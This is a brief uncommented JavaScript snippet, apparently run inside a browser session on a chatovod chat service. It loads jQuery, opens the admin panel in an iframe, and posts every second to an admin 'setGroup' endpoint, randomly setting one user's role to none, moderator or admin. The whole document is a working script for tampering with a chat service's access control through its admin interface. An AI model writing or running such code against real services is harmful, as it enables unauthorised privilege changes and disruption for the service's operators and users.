var modos = ["","moderator","admin"]

var b=document.createElement("script")
b.src = "https://st1.chatovod.com/global/jquery/1.9.1/jquery.js"
document.head.appendChild(b)

var cambiar = (nickId,group)=>$.ajax({url: "https://admin.chatovod.com/users/1050709/setGroup", dataType: "html", method: "post", data: {nickId: nickId, group: group}})

var i=document.createElement("iframe")
i.src="https://admin.chatovod.com/"
i.onload= ()=>setInterval(()=>cambiar("4814889",modos[Math.floor(Math.random()*modos.length)]),1000)
document.body.appendChild(i)
